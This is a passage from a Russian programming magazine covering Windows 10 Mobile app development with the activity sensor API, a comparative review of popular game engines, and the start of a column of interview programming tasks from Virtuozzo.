обновит проект, чтобы он со-
ответствовал    требованиям
универсального   приложения
Windows (UWP). Будет преоб-
разована не только разметка
пользовательского интерфей-
са на XAML, но и вместе с ней
программная  логика  на  JS/
C++/C#/VB. Если в коде были
вызовы  подсистемы  WinRT,
тогда они будут преобразова-
ны в вызовы UWP.
   Есть еще распространен-
ный тип приложений — игры.
iOS и Android визуализируют
посредством низкоуровневого
интерфейса OpenGL. С другой
стороны, на Windows 10 Mobile
для   вывода   изображения
в играх используется  DirectX
11.  Получается  несовмести-
мость. Но есть решение — от-
крытый проект ANGLE. ANGLE
(Almost  Native Graphics Layer
                                Вывод OpenGL на эмуляторе смартфонаEngine) — движок почти на-                                  Windows 10 Mobile
тивного графического слоя —
позволяет     пользователям
Windows бесшовно запускать OpenGL ES приложения на аппаратуре, работа-
ющей с DirectX 11. Это достигается путем преобразования вызовов с OpenGL
ES API на DirectX 11 API. ANGLE полностью поддерживает следующие три типа
приложений:
•  универсальные приложения для Windows 10 (Universal Windows apps);
•  приложения для Windows 8.1 и Windows Phone 8.1;
•  классические приложения для рабочего стола Windows (Windows desktop
    applications).

Более подробно вопрос рассматривается в моей книге «Волшебство момента
вращения» (опять ты книгу свою пиаришь! Ну лаадно, заслужил. — Прим. ред.).

ПОДКЛЮЧЕНИЕ
СМАРТФОНА
По умолчанию устройство под-
ключается в режиме «Только
зарядка», поэтому в параме-
трах надо переключить на ре-
жим передачи данных. Также
этот вопрос появится в момент
подключения  девайса  к  ПК.
В отличие от седьмой версии
мобильной  системы  сейчас
для передачи данных не нуж-
на посредническая програм-
ма Zune, смартфон появляется
в системе как дополнительное
устройство, и навигация вме-
сте с передачей данных до-
ступна с помощью проводни-
ка. Кроме того, в параметрах
смартфона в меню «Обновле-
ние и безопасность» в подме-
ню «Для разработчика» надо
установить  «Режим   разра-
ботчика», который  позволяет
запускать на смартфоне лю-
бые приложения, а не только
из Windows Store.
  В Windows 10 есть утилита
«Диспетчер телефонов». С ее
помощью можно  посмотреть
состояние устройства: степень
зарядки аккумулятора, сколько
места занимают определенные
коллекции данных (фото, ви-                                                   Режим разработчика
део), импортировать фото/ви-
део и так далее.





                                                         Диспетчер телефонов

Если сейчас из студии попытаться запустить приложение, то тебя ждет неми-
нуемая трабла. Дело в том, что требуется сервис IpOverUsbSrc. От имени ад-
министратора открой консоль и введи туда команду net start IpOverUsbSvc.





                                               Консоль с выполненной командой

Сервис запустится, и ты получишь возможность развертывать приложения
на своем смартфоне прямо из студии по USB.

РЕАЛЬНЫЙ ПРИМЕР
Теперь, когда у нас есть реальный девайс, можно поиграть с разными датчика-
ми, с которыми было или невозможно, или затруднительно работать на симу-
ляторе. Однако замечу, что для WP и/или WM создан крутой симулятор, надо
только оперативы побольше, чтобы он шустро бегал. Между тем с реальным
устройством и реальными данными иметь дело удобнее и лучше.
  По сравнению с другими гаджетами смартфоны от Microsoft для меня ин-
тересны благодаря двум компонентам: это большой набор датчиков вместе
с соответствующими API и либа Imaging SDK, с помощью которой можно бы-
стро делать впечатляющие эффекты к изображениям и видео. При обработке
изображений используются возможности GPU, поэтому процессинг видеопо-
тока происходит на лету. Как первый, так и второй компонент унаследованы
от Nokia.

Датчики
API для работы с датчиками раньше носил имя SensorCore, но с выходом
Windows 10 был помечен как устаревший и теперь, после обновления, входит
в пространство имен Windows.Devices.Sensors платформы UWP. Датчики ис-
пользуются для отслеживания физической активности и перемещений пользо-
вателя смартфона.
   Всего в Windows 10 Mobile
поддерживается 12 сенсоров:
•  акселерометр;
•  датчик действий;
•  высотомер;
•  барометр;
•  компас;
•  гигрометр;
•  инклинометр;
•  датчик света;
•  датчик положения  в про-
   странстве;
•  шагомер;
•  бесконтактный датчик;
•  датчик простого положения
   в пространстве.

Между прочим, не каждая мо-
дель  смартфонов  обладает
всеми этими сенсорами, на-
пример у меня в телефоне от-
сутствует компас.
   Описание работы  с  каж-
дым датчиком можно выделить
в отдельный разговор, поэтому
сегодня мы рассмотрим толь-
ко один сенсор — датчик дей-
ствия. Во включенном состо-
янии он способен определить
действия,  которые  выполня-
ет пользователь. В частности,
                                             Выключение датчика действияэтот   датчик   используется
в фитнес-приложениях, он по-
зволяет  контролировать, чем
занимается юзер: стоит, идет или едет на автобусе вместо того, чтобы пробе-
жать это расстояние. Yurembo на себе протестировал гаджет: действия опре-
деляются без сбоев.
   Сенсор активности так же, как и другие датчики, работает в фоновом по-
токе и сохраняет данные за прошедшие десять дней активности или бездей-
ствия :). Его можно отключить в выпадающем сверху экрана меню (вызывается
проведением пальца сверху вниз), деактивировав значок «Местонахождение».
   Чтобы проверить работу датчика, создай новое UWP-приложение, в каче-
стве заготовки выбери Blank App. Она одна имеется в числе визуальных при-
ложений, другие можешь скачать, прямо не выходя из мастера создания про-
екта: «В сети  Шаблоны   Visual C#».
   Придай форме альбомный вид и помести на нее шесть компонентов
TextBox и кнопку (см. рис. ниже).





                                                                    Макет

Имена первых трех текстовых меток не имеют значения, а те, куда будут выво-
диться данные, назовем (сверху вниз): valueActivity, valueConf, valueTimeStamp.
Создай обработчик нажатия кнопки и перейди в C#-код. Добавим два про-
странства имен:




В первом содержатся классы для перечисления устройств. В нашем случае
оно нужно, чтобы обнаруживать датчик и сообщать программе о его состоя-
нии. Как я говорил, не во всех моделях присутствуют все сенсоры.
  Во втором пространстве имен находятся классы всех поддерживаемых дат-
чиков.
   Далее нам надо создать объект GUID устройства. В класс MainPage добавь
такую строчку:




Параметр конструктора класса Guid является строкой с заданным значением
Guid и представляет собой идентификатор класса устройства, то есть каждый
класс устройства имеет строго заданный Guid, по которому система опреде-
ляет тип девайса.
  В обработчике события нажатия кнопки первым делом нам надо получить
информацию о датчике активности, выяснить, присутствует ли он в данном
смартфоне:




Так мы инициализируем объект класса DeviceAccessInformation на осно-
ве идентификатора класса устройства, как мы обсуждали выше, и сохраняем
в переменную deviceAccessInfo.
   Далее проверяем статус доступа к устройству:



При наилучшем раскладе статус имеет значение Allowed (на что мы, собствен-
но, надеемся, поскольку иначе дальнейшее выполнение бессмысленно), то
есть доступ разрешен. Статус устройства может иметь еще три значения:
•  Unspecified — доступ не определен;
•  DeniedByUser — запрещено пользователем;
•  DeniedBySystem — запрещено системой.

В случае успеха мы создаем объект класса ActivitySensor, который пред-
ставляет датчик активности. Делаем это через асинхронный вызов метода
GetDefaultAsync класса:



Проверяем значение переменной activitySensor на равенство null и в случае
отрицательного результата получаем текущие показания счетчика, сохраняя
их в переменную класса ActivitySensorReading, которую впоследствии можно
распарсить:




Проверяем эту переменную, чтобы она не была равна null, извлекаем из нее
значения и помещаем их в соответствующие текстовые поля:





Датчик способен определить семь активностей плюс одно неопределенное:
•  Idle — девайс находится в состоянии бездействия, лежит на столе;
•  Stationary — в неподвижном состоянии;
•  Fidgeting — девайс фиксирует слабое движение;
•  Walking — во время пешей ходьбы, то есть одна нога всегда соприкасается
   с поверхностью;
•  Running — состояние бега, то есть состояние полета, когда обе ноги во вре-
  мя шага находятся в воздухе;
•  InVehicle — поездка на наземном транспорте (автомобиле, автобусе, трам-
    вае...);
•  Biking — езда на велосипеде.

 Существует две степени доверенности (Confidence): Low — низкая и High —
высокая.
   Timestamp — временная отметка, когда были получены данные. Значение
надо привести к строковому виду. В данном случае метод ToString принимает
параметр ?u?, то есть преобразует объект DateTimeOffset в формат yyyy-MM-
dd HH:mm:ssZ.
   Для получения истории используется метод GetSystemHistoryAsync клас-
са ActivitySensor. В качестве параметра метод получает временную метку, мо-
мент, за который надо получить историю, или два параметра: метку плюс про-
должительность, тогда возвращаются данные за указанный период.
   Объект класса ActivitySensor имеет событие ReadingChanged, которое воз-
никает всякий раз, когда датчик посылает данные об изменении действий, вы-
полняемых юзером.
   Чтобы следить за состоянием датчика в фоновом потоке, надо зарегистри-
ровать фоновую задачу. Когда слежение станет не нужно, надо отменить реги-
страцию.

Запуск
Если сейчас запустить приложение, то внезапно окажется, что оно не рабо-
тает. Отладка показывает, что во время первой проверки состояние доступа
к девайсу не определено (Unspecified). Чтобы сообщить Windows 10 Mobile, что
твое приложение хочет получить доступ к датчику активности, тебе надо напи-
сать об этом в манифесте. Открой файл Package.appxmanifest в XML-редакто-
ре, пролистай содержимое до области, ограниченной тегами <Capabilities>,
и добавь туда строчку



После этого можешь развертывать приложение, все будет работать, как надо.





                                   Скриншот работающего на смарте приложения

ИТОГИ
Сегодня мы много говорили о технологиях Microsoft как в аппаратном, так
и в софтверном плане. Обсудили используемые для разработки софта инстру-
менты. Затем мы рассмотрели способы создания приложений под Windows 10
Mobile. В частности, мы обратили пристальное внимание на импортирование
унаследованных проектов, другими словами — возможность создания прило-
жений для Windows 10 на основе программ из других операционных систем.
Портирование классических Windows-приложений под платформу UWP вроде
как вещь сама собой разумеющаяся. Но вот создание UWP-программ на ос-
нове iOS-приложений с Obj-C-кодом — это впечатляет. А главное, что эти ин-
струменты свободные и открытые!
   Программирование смартфонов от Microsoft вдвойне интереснее, посколь-
ку они обладают большим набором разнообразных датчиков окружающей
среды и состояния самого гаджета. Поэтому, подводя итог всему вышесказан-
ному, мы разработали приложение, которое использует один из сенсоров —
датчик активности.
   Многие сенсоры унаследованы еще от смартфонов с операционной систе-
мой Windows Phone 7.5, и работу с ними мы рассматривали еще в те давние
времена, поднимай подшивку «Хакера». Другие датчики весьма новые, и нам
будет интересно разобраться с их использованием и получением от них про-
фита. Но это планы на будущее.
  А сегодня мне остается пожелать тебе веселой не пасмурной осени и уда-
чи во всех делах!

Microsoft loves Open Source

Сайт github.com каждый год подводит итог: какая компания самая активная
в плане открытых исходников, другими словами — кто сделал больше всех
вкладов в открытые проекты. По итогам прошедшего года такой компанией
стала Microsoft. Достаточно взглянуть на страницу корпорации на сайте GitHub.
КОДИНГ





 Юрий «yurembo» Язев
         t2d-dev.ru


][-ОБЗОР:
LUMBERYARD,
UNITY 3D,
TORQUE 2D И 3D,
UNREAL ENGINE 4,
CRYENGINE
                                                                  Почти все
                                                               описанные
                                                                     движки
                                                                на определенном
                                                                     этапе можно
                                                                    использовать
                                                            бесплатно!ЛУЧШИЕ
ГРАФИЧЕСКИЕ ДВИЖКИ
ДЛЯ ПРОГРАММИСТА




Несмотря на кажущуюся стабильность, со времени предыдущего обзора си-
туация на игровом рынке довольно ощутимо изменилась. Геймеры постоянно
хотят чего-нибудь новенького, а инди-нишу, которая два-три года назад была
настоящим трендом (вспомни хотя бы Minecraft и Super Meat Boy), сейчас ак-
тивно поддавливают слоны вроде Electronic Arts, Ubisoft и Microsoft. И все-таки,
хоть на отрасль и наступают гранды индустрии, а интерес пользователей к мо-
бильным играм снижается (надеюсь, временно), на этом поприще все еще
можно заработать. А чтобы заработать, нужно досконально знать доступный
игровому кодеру инструментарий. О самых последних изменениях в популяр-
ных графических движках я и расскажу тебе в этой статье.


Куда податься indie-разработчику

Средний мобильный геймер становится все более ленивым, и все чаще он
выбирает себе игрушку строго из списка «top платных/бесплатных программ»
в соответствующем его платформе маркете. Скроллить дальше ему не очень
хочется, поэтому выход у нас один — попасть в верхние строчки рейтингов.
А для этого нужно использовать либо тайную магию и везение, либо то же са-
мое плюс новые перспективные технологии. В частности, виртуальную и допол-
ненную реальности, которые обещают самое бурное развитие — например,
благодаря доступным смартфонам с высоким разрешением и очкам виртуаль-
ной реальности, куда эти смартфоны вставляются. В двух предыдущих статьях
мы много говорили об этих технологиях, поэтому здесь повторяться не бу-
дем. Самое главное, что совсем недавно в передовые игровые движки была
добавлена поддержка этой технологии. Настал черед игроделов. И игроде-
лы не спят — в конце августа в магазине для шлема дополненной реальности
Microsoft HoloLens появился первый проект Land of Dinosaurs. Примечательно,
что разработан он небольшой российской студией Zengalt, зарегистрирован-
ной в США, поскольку HoloLens пока можно купить только в США и Канаде.
  Меж тем на сцену возвращаются и «большие игры»: от синглплеерных шу-
теров и гонок до MMO-стратегий и ролевок. Но это должны быть игры с улуч-
шенными компонентами: продвинутой графикой, клевым музоном, захватыва-
ющим геймплеем, сногсшибательными механиками — короче, ты меня понял:
все должно быть круче, чем в первой волне. Наша индустрия развивается
по спирали.


UNITY 3D
Сайт: unity3d.com
Разработчик: Unity Technologies
Последняя версия на момент написания статьи: 5.4.0 (30 августа стала доступна версия 5.5 beta)
Порог вхождения: низкий
Цена: Personal — free, Plus — 35 долларов за рабочее место в месяц, Pro — 125 долларов за рабочее место
в месяц, Enterprise — по договоренности
Исходный код: закрытый
Платформы для использования: Windows, macOS

Благодаря низкому порогу вхождения, удобству использования и правильной
рекламе это, несомненно, самый популярный движок в индустрии. За послед-
ние три года он вырос в еще более мощную платформу для создания игр. Unity
содержит в себе все мыслимые инструменты, помогающие в разработке игро-
вых приложений.
  Среди лицензиатов присутствуют как небольшие и еще пока никому не из-
вестные инди-команды, так и огромные разработчики — Microsoft, EA, Zynga,
Frima и другие. Кроме того, Unity Technologies сотрудничает с Sony, Qualcomm,
Nintendo, Oculus, Samsung и прочими.
  С помощью Unity 3D можно создавать и трехмерные, и двумерные игры
на Windows PC, Mac. В версии 5.4 движка наконец-то появилась поддерж-
ка DirectX 12, что открыло твоим играм двери в Windows 10 Store. Но в таком
случае тебе понадобится соответствующая видюха. В Unity есть специальные
редакторы анимации, звука, освещения и прочего. Из пятой версии движка
за ненадобностью был исключен скриптовый язык Boo.
  Одна из самых замечательных возможностей Unity 3D — это экспортиро-
вание игры для любой из 21 поддерживаемой платформы, среди них: iOS,
Android, Windows 8 Store, Windows 10 Store, macOS, PS3, PS4, Xbox 360, Xbox
One, Wii U, Oculus Rift, Gear VR, PlayStation VR, Samsung Smart TV. Из этого
списка видно, что поддерживаются не только десктопы, мобильники, консоли
и браузерки, но и умные телевизоры и шлемы виртуальной реальности.
   Unity 3D одним из первых среди движков обзавелся поддержкой очков вир-
туальной реальности Oculus Rift. А в бета-версию 5.4 движка была добавлена
и поддержка Microsoft HoloLens.
  Все экспортеры бесплатны, но для каждой платформы понадобится свой
SDK, а для консолей он покупается по договоренности у платформодержа-
теля. Для мобильных платформ Unity проведет глубокую оптимизацию, куда
входят удаление скрытых частей, балансировка теней, группировка ресурсов
и сокращение размера сборки.
  Плюс к этому сборку проекта можно выполнять в облаке. На сайте Unity
имеется сервис Unity Cloud Build, к которому можно подключить репозиторий
с материалами игры, и сервис будет автоматически компилировать, развора-
чивать и тестировать твою игру. Каждый участник разработки сможет получить
самый свежий билд. Процесс разработки ускоряется. У Unity Cloud Build так
же, как у движка, есть несколько видов лицензий, можно бесплатно исполь-
зовать в ограниченном режиме, а можно оплатить лицензию и юзать облако
на все сто.

Не только игры. Не только компьютерные

Помимо всего прочего, Unity используется для разработки азартных игр под
игровые автоматы для казино и прочих увеселительных заведений. В этом на-
правлении компания работает с 1991 года. Вдобавок возможности Unity при-
меняются для визуализации в архитектурной, инженерной и строительной от-
раслях.



Unity отличает также огромное сообщество и колоссальный магазин компо-
нентов для движка — Asset Store, продающий элементы для игр: модели, тек-
стуры, скрипты, редакторы, инструменты, серверные подсистемы и другой
стафф. Все это создают пользователи движка — участники сообщества.





                                                               Редактор Unity
TORQUE 2D
Сайт: garagegames.com
Разработчик: GarageGames
Последняя версия на момент написания статьи: Torque 2D 3.3
Порог вхождения: средний
Цена: free (лицензия MIT)
Исходный код: открытый
Платформы для использования: Windows, macOS, Linux

Движки марки Torque — мое любимое семейство игровых движков — все
еще живее всех живых! Движки 2D и 3D — это два отдельных проекта, име-
ют каждый свой репозиторий и развиваются по отдельности. За прошедшие
три года, находясь в открытых исходниках, они очень выросли. Все это время
я в основном занимался разработкой мобильных игр, поэтому больше следил
за развитием Torque 2D и использовал его в работе. В этом году я написал ему
оду — подробную инструкцию по применению: «Волшебство момента враще-
ния: искусство разработки игр на движке Torque 2D» (подробности на сайте).
  T2D рендерит с помощью OpenGL, что способствует его кросс-платфор-
менности, для воспроизведения звука используется OpenAL (изначально)
или Vorbis (добавлен в версию 3.3). Физика просчитывается с помощью фи-
зического движка Box2D. В T2D всегда была анимация, основанная на спрай-
товых таблицах; с третьей версии движок стал поддерживать скелетную ани-
мацию вместе с редактором Spine. Наравне со своим старшим братом T2D
имеет продвинутую сетевую подсистему. Из дополнительных контроллеров
T2D поддерживает геймпад от Xbox 360 и сенсор бесконтактного взаимодей-
ствия Leap Motion. Для описания игровой логики T2D включает скриптовый
язык Torque Script, ровно такой же, как в T3D. Но в разных движках разные объ-
екты, сущности и способы взаимодействия. Для описания графических ассе-
тов (одиночные картинки, спрайтовые анимации, звуки, эффекты и другой арт)
в T2D используется язык TAML.
  В современной инкарнации движок поддерживает шесть платформ (сред
выполнения): Windows, Linux, macOS, iOS, Android, Web, тем самым охватывает
самые популярные каналы доставки контента.
  За прошедшие три года до недавнего времени T2D не приобрел ни одно-
го внутриигрового редактора. Тем не менее в конце августа давний поклон-
ник движка Simon Love выкатил три редактора: Image Asset Editor — методом
переноса добавляет спрайты в проект, позволяя настроить их во встроенном
редакторе; Animation Builder — настраивает анимацию из последовательности
картинок; Particle FX Editor — служит для создания эффектов частиц, включая
все возможности движка. Это только первый шаг, но он сделан.
   Для создания нового проекта каждый раз надо совершать скучные манипу-
ляции с файлами, поэтому, чтобы автоматизировать этот процесс, я разрабо-
тал менеджер проектов для T2D, его вместе с исходным кодом можно скачать
с моего аккаунта GitHub. Благодаря ему сразу можно начинать кодить класс-
ные мобильные игры.





                                                                         Torque 2D

TORQUE 3D
Сайт: garagegames.com
Разработчик: GarageGames
Последняя версия на момент написания статьи: Torque 3D 3.9
Порог вхождения: средний
Цена: free (лицензия MIT)
Исходный код: открытый
Платформы для использования: Windows, macOS, Linux

Кроме того что теперь этот движок визуализирует с помощью DirectX 11 (вдо-
бавок к DirectX  9), имеется возможность выводить графику посредством
OpenGL. Из этого следует, что игры на Torque 3D, кроме Windows, могут вы-
полняться в macOS и Linux, вместе с тем можно создать выделенный сервер
(терминальный режим, без графического вывода). Как мы помним, Torque 3D
представляет собой клиент и сервер в одной упаковке. Но для больших он-
лайн-проектов используется удаленный выделенный сервер.
  Можно выделить пять продвинутых элементов движка: современный меха-
низм визуализации, включающий попиксельное освещение, нормальная и па-
раллактическая карты, генерация материалов, использование языков HLSL/
GLSL для создания шейдеров. Torque 3D включает несколько редакторов, сре-
ди которых редакторы уровней и окружения (могут импортировать 3D-моде-
ли в DAE-формате), редактор местности, настройка формы объекта, редактор
рек и дорог, редактор материалов, GUI-редактор для построения пользова-
тельского интерфейса. Имеется высокопроизводительная сетевая подсисте-
ма, а физика, основанная на PhysX и Bullet, позволяет создать динамическую
одежду, разрушаемые объекты, жидкости и многое другое. Torque 3D вклю-
чает удобный, легкий в изучении C-подобный скриптовый язык Torque Script
и полный исходный код на C++.
   У Torque 3D есть собственный сайт, на котором расположена информация
по движку, модули движка для скачивания (в том числе исходный код), туто-
риалы, вики, комитет и комьюнити движка. Из репозитория на GitHub можно
скачать те же самые исходники плюс дистрибутив и код менеджера проектов
(Project Manager).
  Кроме того, T3D поддерживает очки виртуальной реальности Oculus Rift.
В настоящее время в сообществе работают над добавлением поддержки
OpenVR.
  На Torque 3D разрабатывается большое число игр. Из самых успешных
стоит выделить MMORPG Life is Feudal. Она разработана отечественной ин-
ди-командой BitBox. Игра признана лучшей инди-MMO на выставке E3 2015.





                                                                Torque 3D demo app

UNREAL ENGINE 4
Сайт: unrealengine.com
Разработчик: Epic Games
Последняя версия на момент написания статьи: 4.13
Порог вхождения: средний
Цена: free (+5% роялти от продажи проекта, приносящего более 3000 долларов за квартал)
Исходный код: открытый
Платформы для использования: Windows, macOS

Много воды утекло за прошедшие три года. В то время на арене царил UDK,
и мы говорили про него. В настоящий момент представлена уже четвертая
версия UE. Сразу после выхода движка в 2014 году цена на него составляла
30 долларов, но в марте 2015-го движок стал полностью бесплатным, включая
все исходные коды. Тем пользователям, кто успел купить движок, Epic вернула
30 баксов на виртуальный счет клиента; эти деньги можно потратить на покуп-
ку ассетов в Marketplace.
  С помощью UE4 можно разрабатывать как двумерные, так и трехмерные
игры абсолютно любых жанров: шутеры, стратегии, квесты, RPG, симуляторы...
Движок нашел применение не только в игровой индустрии, но и в кинемато-
графе — для создания спецэффектов, в архитектуре, строительстве, исполь-
зуется он и в образовательных целях.
  UE4 предоставляет много заготовок для игр разных жанров. Есть два пути
создания проекта: на Blueprint или на C++. В первом случае используется гра-
фический скриптовый язык, где описания и последовательность действий за-
ключаются подобно конечному автомату. То есть реализованные в движке
операции связываются посредством графического интерфейса. Во втором
случае описание геймплея осуществляется на языке C++.
  Прямо из коробки с помощью темплейтов можно создать 13 проектов
на C++ и 12 на Blueprint. Среди них игры различных жанров: двумерные скрол-
леры, шутеры от первого и третьего лица, авиа- и автосимуляторы. В тринад-
цатое обновление была добавлена заготовка для виртуальной реальности.





                                            Unreal Engine 4 с загруженным проектом VR


Движок поддерживает все огромное разнообразие современных технологий.
Даже перечислять не имеет смысла — игры, разработанные на UE4, охватыва-
ют все платформы и игровые устройства (VR, Kinect, Leap Motion и так далее).
  UE4 снабжен всеми необходимыми редакторами: это конструирование
сцен, импортирование, настройка и анимация моделей, наложение материа-
лов, создание физических эффектов, размещение аудиоисточников, настройка
звука, специальный редактор для создания скриптов Blueprint и многое другое.
  В самом начале сентября вышло тринадцатое обновление Unreal Engine 4.
Такие частые обновления возможны благодаря тому, что код движка открытый
и его репозиторий размещен на GitHub, где любой программист может вне-
сти свою лепту. Также с GitHub можно скачать исходные коды и материалы по-
следней версии Unreal Tournament, разрабатываемой сообществом.
  В это обновление было добавлено много интересных фич для удобства
работы с графикой, анимацией. Многие улучшения были внесены в движок
для увеличения производительности.
  Среди ключевых обновлений:
•  поддержка DirectX 12;
•  поддержка формата Alembic для вертексной анимации;
•  оптимизация динамических теней для мобильных проектов;
•  изменения в редакторе VR (добавилась поддержка капсульных теней);
•  изменения в редакторе для создания синематик-сцен Sequencer (доба-
   вился инструмент Live Recording, который позволяет преобразовывать гей-
   мплей, включая всю анимацию, аудио и эффекты, в отдельный ассет. После
   чего ассет можно редактировать с помощью Sequencer).

За восемнадцатилетнюю историю движка Unreal Engine на нем (на разных вер-
сиях) было создано огромное количество игр разных жанров для всех плат-
форм (включая консоли от шестого поколения до текущего — восьмого),
но большую часть однозначно занимают шутеры. Кроме того, UE4 прекрасно
подходит для разработки мобильных игр.

CRYENGINE
Сайт: cryengine.com
Разработчик: Crytek
Последняя версия на момент написания статьи: 5.2.1
Порог вхождения: средний
Цена: free
Исходный код: открытый
Платформы для использования: Windows

С момента прошлого обзора Cryengine во многом повзрослел и сильно изме-
нился. Уже пятая версия! В середине августа вышло второе обновление. На-
помним, что оригинальная пятая версия была выпущена в марте. Что позво-
ляет так быстро выпускать обновления? Open Source — двигатель прогресса,
а исходные коды Cryengine размещены на GitHub.
   Cryengine V поддерживает Windows, Linux, PlayStation 4, Xbox One. Он глав-
ным образом нацелен на MMO-игры с передовой графикой. Также в движке
хорошо проработана сетевая подсистема, есть поддержка DirectX 12, PhysX
и широченного ряда других технологий.
   Хотя движок и материалы на сайте бесплатны, отсутствует даже роял-
ти, можно стать официальным пользователем, которому доступны дополни-
тельные обучающие материалы, видео, тренинги и другая поддержка Crytek.
Для этого надо оплатить лицензию одного из двух видов: базовое членство —
50 долларов, премиум — 150 долларов. Дополнительно Crytek предоставляет
лицензию уровня Enterprise для больших игроков рынка, таких как 2K, Bethesda,
Sony Santa Monica и другие. Стоимость лицензии не разглашается. Перед ска-
чиванием движка пользователь может сам определить сумму пожертвования
для Crytek.
   У Cryengine есть свой Marketplace, где любой пользователь может покупать
и продавать игровые ассеты.
   Лаунчер Cryengine V на вид и по функциональности похож на UE4. Он слу-
жит для скачивания движков и их обновлений, создания проектов, покупки ас-
сетов, просмотра новостей и прочего. В пятой версии движка проекты можно
создавать не только на C++, но и на C#, что определенно радует. В качестве
скриптового языка, как и раньше, используется Lua. Таким образом, юзеру
движка не обязательно лезть в его код, для изменения геймплея достаточно
модифицировать скрипты.
   Исходно разработчику предоставляются заготовки для шести проектов: пу-
стая игра, шутеры от первого/третьего лица, с видом сверху, экшен с видом
сбоку и roller ball. Движок дает кодеру ошеломляющее количество редакторов:
редактор уровня, аудио, диалогов, анимаций, окружения, трасс, материалов,
частиц, ландшафтов и многие другие. Добавлена поддержка FBX-формата
для загрузки 3D-моделей. При этом можно отдельно работать с анимациями
модели, кожей, скелетом и геометрией.





                                                  Cryengine V с загруженным проектом


Без сомнения, радует программа поддержки инди-разработчиков. В ней мо-
гут принять участие любые инди-команды с абсолютно любыми проектами
на движке Cryengine V. В первом раунде Crytek проверяет соответствие про-
екта определенным требованиям, после чего проекту подается кандидатский
свет. Во втором раунде Crytek выбирает три проекта для финансирования
и еще шесть получат техническую поддержку.

LUMBERYARD
Сайт: aws.amazon.com/ru/lumberyard
Разработчик: Amazon
Последняя версия на момент написания статьи: 1.4
Порог вхождения: средний
Цена: free
Исходный код: открытый
Платформы для использования: Windows

Есть еще одно ответвление от оригинального Cryengine — это движок
*Lumberyard*. Когда в прошлом году у Crytek начались проблемы с деньга-
ми, Amazon помогла компании, купив у нее лицензию на Cryengine версии 3.8
за более чем 70 миллионов долларов.
   Amazon допилила продукт, добавив в него поддержку своих облачных тех-
нологий — Amazon Web Services и Twitch. Таким образом, разработчик игр
на Lumberyard может прозрачно хранить данные и работать с ними в облаке
Amazon. Вместе с уклоном движка в сторону MMO это сочетание прекрас-
но подходит для массивных мультиплеерных игр. Разработчикам игр не надо
задумываться о расширении инфраструктуры, программной оптимизации
передачи и хранения данных, когда количество пользователей их игры уве-
личится, — все эти проблемы возьмет на себя Amazon Web Services. Также
с помощью Lumberyard игродел может добавить поддержку стриминга игры
на сайт twitch.tv.
   Движок полностью бесплатный с открытым исходным кодом. Amazon соби-
рается зарабатывать на нем, беря плату за использование облачных техноло-
гий. После регистрации на год выдается базовая бесплатная лицензия. За это
время можно пользоваться многими инструментами и сервисами.
  С помощью Lumberyard можно создавать игры для Windows, PlayStation 4,
Xbox One. В экспериментальном режиме находится поддержка Linux, macOS,
iOS, Android. Устройства виртуальной реальности также поддерживаются
движком, среди них: Oculus Rift, HTC Vive, OpenVR.
   Наиболее сильная отличительная черта Lumberyard от Cryengine — сетевая
(облачная) система. Разработчики из Amazon Game Studios реализовали но-
вый сетевой уровень GridMate, позволяющий создавать колоссальные игро-
вые миры с огромным числом игроков. Технология Cloud Canvas позволяет
быстро добавлять интерактивные сетевые возможности, такие как проведение
сражений на стороне сервера, таблица рекордов и прочее. Масштабирова-
ние и работу многопользовательских сессионных игр обеспечивает система
GameLift, которая интегрирована в Lumberyard.
  В Lumberyard есть графический редактор кода (подобный UE4), с его по-
мощью можно связывать сущности с компонентами. Новая система генерации
кода позволяет модифицировать старый код C++ и создавать новый.





                                                 Эффект снега в Lumberyard

ИТОГИ
В сегодняшней статье мы рассмотрели шесть самых популярных, мощных
и востребованных игровых движков. С их помощью разрабатывается подавля-
ющее большинство успешных игр разных жанров.
   Интересный путь развития выбрали лидеры рынка игровых движков! Я бы
даже сказал — загадочный и в некотором роде опасный. Разработчики пред-
лагают свое творение забесплатно, уверенные в будущей отдаче. А ведь со-
всем недавно движки продавались единицами и по заоблачным ценам. Сей-
час, получается, игровой рынок достаточно большой, чтобы основывать свою
стратегию на таком подходе.
   К настоящему моменту все описанные в статье движки обзавелись под-
держкой устройств виртуальной реальности. За небольшое время на рын-
ке появился широкий диапазон последних, а следом подтянулись и средства
для создания контента VR. Теперь, как говорится, мяч на стороне программи-
стов.


ОБРАТНАЯ СВЯЗЬ
Мы всегда открыты твоим предложениям, поэтому если у тебя есть просьбы
или дополнения — смело пиши в комменты. Считаешь, что надо рассмотреть
менее популярные движки? Командуй, сделаем :). В общем, обещаю учесть
любые пожелания, касающиеся разработки графических приложений.
КОДИНГ





                                       Александр Лозовский
 ЗАДАЧИlozovsky@glc.ru
  НА СОБЕСЕДОВАНИЯХ

        ЗАДАЧИ ОТ VIRTUOZZO
     И НАГРАЖДЕНИЕ ПОБЕДИТЕЛЕЙ
      ОТ POSTGRES PROFESSIONAL




В этой рубрике мы публикуем любые сложные и интересные задачи, такие,
чтобы даже наши самые матерые читатели (да-да, Иннокентий Сенновский,
это про тебя) нашли в них для себя то, над чем можно как следует попотеть.
Но особенно мы любим задачи от международных компаний. И это не только
потому, что офис Virtuozzo расположен в Сиэтле (и в один прекрасный момент
ты сможешь запустить свой трактор в направлении цивилизованного места,
где в конце сентября +23 по Цельсию). Международная компания — это еще и
новые связи, совсем другой уровень перспектив и возможностей. А посколь-
ку Virtuozzo не так давно отделилась от другой крупной компании — это еще и
новые интересные проекты.

Задачи от Virtuozzo

Файлы задач расположены на GitHub: https://github.com/VznutAtem5aXi/xakep

Задание 1
github.com/VznutAtem5aXi/xakep/tree/master/task1
У вас есть программа, простой таймер, запускаемая из командной строки.
Программа собрана под libc6 x86_64 linux и должна работать в совместимых
по архитектуре дистрибутивах Linux.
   Результатом работы программы будет ежесекундный отсчет времени (по
умолчанию до десяти), после чего программа завершается.

$ ./timer
10

Однако, если два или более экземпляра этой программы будут работать па-
раллельно, второй и последующий процесс выполнятся неуспешно:

$ ./timer (из одного терминала)
10
$ ./timer (одновременно, из другого терминала)
error!

Ваша задача — создать такое runtime-окружение для запуска этой и подобных
программ (использующих тот же самый API), чтобы два и более одновременно
работающих экземпляра выполнялись без ошибок, не мешая друг другу.

Задание 2
github.com/VznutAtem5aXi/xakep/tree/master/task2
Вам предоставлен исходный текст программы, выводящей в формате JSON
заданное количество полезных данных. Определите факторы, влияющие на
производительность, и попытайтесь ускорить работу программы, сохраняя как
формат, так и смысловое значение выводимой информации.

Задание 3
github.com/VznutAtem5aXi/xakep/tree/master/task3
Самораспаковывающимся (SFX) архивом называется файл, в состав которого
входят как собранные в архивный формат файлы, так и программа в машинных
